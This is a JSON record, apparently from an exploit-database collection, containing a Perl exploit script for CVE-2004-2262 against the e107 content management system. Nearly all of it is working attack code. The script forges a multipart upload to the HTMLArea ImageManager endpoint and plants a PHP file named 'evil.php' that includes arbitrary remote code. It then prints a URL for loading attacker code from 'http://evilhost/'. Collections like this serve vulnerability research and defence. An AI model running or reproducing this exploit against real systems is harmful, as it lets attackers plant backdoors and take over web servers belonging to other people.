{
  "id": "704",
  "title": "e107 - &#039;include()&#039; Remote File Upload",
  "cve": "CVE-2004-2262",
  "vuln_type": "file_upload",
  "code": "####################################################################\r\n#\r\n#  _____ _\r\n# |  ___| | _____      ___\r\n# | |_  | |/ _ \\ \\ /\\ / /\r\n# |  _| | | (_) \\ V  V /\r\n# |_|   |_|\\___/ \\_/\\_/\r\n#      Security Group.\r\n#\r\n#                    -=[ e107 remote sploit ]=-                           \r\n#                           by sysbug \r\n#                              \r\n# Attack method:                                                               \r\n# with this sploit u can send an include() vuln to a Host victim  \r\n# the upload go to /images/evil.php\r\n#                                                                \r\n# C:\\Perl\\bin>perl sploit.pl www.site.com                          \r\n# -=[ e107 remote sploit ]=-                                      \r\n#         by sysbug \r\n# # www.site.com\r\n# # OWNED OH YEAH!                                                \r\n# # get your evilc0de in:                                          \r\n# # www.site.com/images/evil.php?owned=http://evilhost/ \r\n# C:\\Perl\\bin>                                                     \r\n# \r\n# credits: ALL MY FRIENDS!                                                                 \r\n# HELP ? RTFM -> perl sploit.pl                                                                \r\n#####################################################################\r\nuse IO::Socket;\r\n\r\nif(@ARGV < 1){\r\nusage();\r\nexit;\r\n}\r\nmain();\r\n\r\nsub main(){\r\n\r\nprint \"-=[ e107 remote sploit ]=-\\n\";\r\nprint \"        by sysbug       \\n\\n\";\r\n$host[0] = $ARGV[0];\r\nif($host[0] =~ /\\//){\r\n($host[1],$host[2])=split(/\\//,$host[0]);\r\n$host[0] =~ /\\/(.*)/;\r\n$host[3] = \"/\";\r\n$host[3] .= $1;\r\n}\r\n$host[1] = $host[0] if(!$host[1]);\r\n@handlers =(\"e107_handlers\",\"handlers\");\r\nprint \"# $host[1]\\n\";\r\nforeach $handler(@handlers){\r\n$path = \"$host[3]/$handler/htmlarea/popups/ImageManager/images.php\";\r\n$socket=IO::Socket::INET->new(Proto=>'tcp',PeerAddr=>$host[1],PeerPort=>80,Timeout=>10)|| die \"  s0k off\\n\";\r\nprint $socket \"POST $path HTTP/1.1\\r\\n\";\r\nprint $socket \"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\nprint $socket \"Referer: http://www.lapropinacultural.com.ar/handlers/htmlarea/popups/insert_image.php\\r\\n\";\r\nprint $socket \"Accept-Language: pt\\r\\n\";\r\nprint $socket \"Content-Type: multipart/form-data; boundary=---------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Accept-Encoding: gzip, deflate\\r\\n\";\r\nprint $socket \"User-Agent: l33t br0ws3r\\r\\n\";\r\nprint $socket \"Host: $host[1]\\r\\n\";\r\nprint $socket \"Content-Length: 1646\\r\\n\";\r\nprint $socket \"Connection: Keep-Alive\\r\\n\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Content-Disposition: form-data; name=\\\"dirPath\\\"\\r\\n\\r\\n\";\r\nprint $socket \"/\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Content-Disposition: form-data; name=\\\"url\\\"\\r\\n\\r\\n\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Content-Disposition: form-data; name=\\\"width\\\"\\r\\n\\r\\n\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Content-Disposition: form-data; name=\\\"vert\\\"\\r\\n\\r\\n\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Content-Disposition: form-data; name=\\\"alt\\\"\\r\\n\\r\\n\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Content-Disposition: form-data; name=\\\"height\\\"\\r\\n\\r\\n\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Content-Disposition: form-data; name=\\\"horiz\\\"\\r\\n\\r\\n\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Content-Disposition: form-data; name=\\\"upload\\\"; filename=\\\"evil.php\\\"\\r\\n\";\r\nprint $socket \"Content-Type: application/octet-stream\\r\\n\\r\\n\";\r\nprint $socket \"<? include(\\$owned); ?>\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Content-Disposition: form-data; name=\\\"align\\\"\\r\\n\\r\\n\";\r\nprint $socket \"baseline\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Content-Disposition: form-data; name=\\\"border\\\"\\r\\n\\r\\n\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Content-Disposition: form-data; name=\\\"orginal_width\\\"\\r\\n\\r\\n\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Content-Disposition: form-data; name=\\\"orginal_height\\\"\\r\\n\\r\\n\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Content-Disposition: form-data; name=\\\"constrain_prop\\\"\\r\\n\\r\\n\";\r\nprint $socket \"on\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Content-Disposition: form-data; name=\\\"ok\\\"\\r\\n\\r\\n\";\r\nprint $socket \"Refresh\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Content-Disposition: form-data; name=\\\"ok\\\"\\r\\n\\r\\n\";\r\nprint $socket \"OK\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8\\r\\n\";\r\nprint $socket \"Content-Disposition: form-data; name=\\\"cancel\\\"\\r\\n\\r\\n\";\r\nprint $socket \"Cancel\\r\\n\";\r\nprint $socket \"-----------------------------7d410e113f8--\\r\\n\\r\\n\\r\\n\\r\\n\";\r\n@socket = <$socket>;\r\nforeach $teste(@socket){\r\nif($teste=~ /<title>Image Browser<\\/title>/){\r\nprint \"# OWNED OH YEAH!\\n\";\r\nprint \"# get your evilc0de in: \\n# $host[0]/images/evil.php?owned=http://evilhost/\\n\";\r\n$result = 1;\r\n}\r\n}\r\nclose($socket);\r\n}\r\nif($result){\r\nexit;\r\n}\r\nprint \"# b4d upload!!\";\r\n}\r\nsub usage(){\r\nprint \"-=[ e107 remote sploit ]=-\\n\";\r\nprint \"        by sysbug       \\n\\n\";\r\nprint \"# usage: perl $0 <host> \\n\";\r\n}\r\n\r\n# milw0rm.com [2004-12-22]",
  "url": "https://www.exploit-db.com/exploits/704"
}